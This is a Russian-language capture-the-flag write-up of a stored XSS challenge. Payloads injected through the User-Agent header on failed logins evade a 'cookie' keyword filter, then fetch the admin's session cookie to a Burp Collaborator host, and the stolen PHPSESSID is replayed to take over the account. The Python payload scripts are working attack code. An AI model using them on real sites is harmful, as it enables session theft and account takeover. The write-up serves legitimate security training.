# Forbidden code writeup
Указанная сложность таска - сложный

Для начала перейдем по указанному нам ip-адресу
>***62.173.140.174: 16013***

Вот что нас встречает
![image](https://github.com/BlankGODDAMN/codeby_writeup/assets/162637113/db842813-38bb-4e0c-b884-06ad635d44e7)

Похоже на форму входа, есть ссылка на регистрацию, ну, попробуем зарегистрироваться 
![image](https://github.com/BlankGODDAMN/codeby_writeup/assets/162637113/9ea47466-4aac-4229-b349-ba2983d2498d)

Нам пишут о неудачных попытках входа, значит попробуем неудачно зайти, и обновить страницу

![image](https://github.com/BlankGODDAMN/codeby_writeup/assets/162637113/a45efe91-90ed-46dc-9c6c-112293142e8a)

Отлично! Нам показывают данные о неудачной попытке

Итак, мы можем что-то вводить, кто-то может получать, надо проверять на XSS уязвимости.
Регистрируем пользователя с ником `<script>alert(2)</script>` и после пытаемся провально зайти на него с другого браузера

![image](https://github.com/BlankGODDAMN/codeby_writeup/assets/162637113/adfe66e3-e75a-4a13-9951-59396e3a76f7)

Мы получили сообщение,это значит, что сайт уязвим. Вспомним, что мы видим в информации о попытке входа, и подумаем что нам подсилу поменять.
Подделать ip-адрес под скрипт у нас не получиться, ник тоже, а вот **user-agent**, звучит возможным.

Нам нужны куки админа, что бы нам дали доступ к его аккаунту. Спрашиваем у гугла, как получать печенье, и понимаем, что нам нужено перехватить **document.cookie**. Передадим его в обычный ``alert``, нам понадобиться небольшой код на питоне.
```
import requests


payload = '<script>alert(document.cookie);</script>'

user = "{имя нашего пользователя}" 
headers = {'User-Agent': payload}
data = {"username":user, "password":"aboba"}


response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)
 
print(response.status_code)
print(response.text)
```

И вроде мы ко всему готовы, но не к фильтрации, в таксе фильтруется слово **cookie**, почему бы нам его не разбить на две части с помощью массива, js соединит их в едино, и так мы обойдём фильтрацию
```
import requests


payload = '<script>const vv = ["coo", "kie"].join("");alert(document[vv]);</script>'

user = "{имя нашего пользователя}" 
headers = {'User-Agent': payload}
data = {"username":user, "password":"aboba"}


response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)
 
print(response.status_code)
print(response.text)
```

Мы обошли!

Дальше нам понадобиться Burp Suite Pro, способ получения не важен.

Если быть точнее, то нам нужна вкладка **Collaborator**
![image](https://github.com/BlankGODDAMN/codeby_writeup/assets/162637113/f18be37f-db23-49dc-854e-6eeb7d464f43)

Нажимаем на кнопку **Copy clipboard**, то что мы скопировали вставляем к нам код, я указ место для вставки как *ссылка перехвата*
```
import requests


payload = '<script>const vv = ["coo", "kie"].join(""); var payload = `https://{{ссылка для перехвата}}/?${vv}=` + document[vv]; fetch(payload);</script>'

user = "admin" 
headers = {'User-Agent': payload}
data = {"username":user, "password":"aboba"}


response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)
 
print(response.status_code)
print(response.text)
```

Запускаем наш код, ждём минутку, и наживаем на конопку **pull now** в Burp Suit

![image](https://github.com/BlankGODDAMN/codeby_writeup/assets/162637113/04b4c2be-0c82-41ce-b8b2-603ff2fc8cd6)

Рассмотрим наш улов.  
>cookie=PHPSESSID=um1h6ekatsrb2drjjas4msqamu

***В случае если нет возможности использовать Burp Suit, можно воспользоваться webhook***

Это и есть печенье нашего админа, сделаем так, что бы он с нами поделился, с помощью **Cookie-Editor**

![image](https://github.com/BlankGODDAMN/codeby_writeup/assets/162637113/a3b44f5a-2104-415f-915e-2d761ea30d16)

Сохраняем, пытаемся зайти под ником **admin** и видим наш флаг

![image](https://github.com/BlankGODDAMN/codeby_writeup/assets/162637113/d5e03990-a226-4ffc-9e9f-d24499e95391)
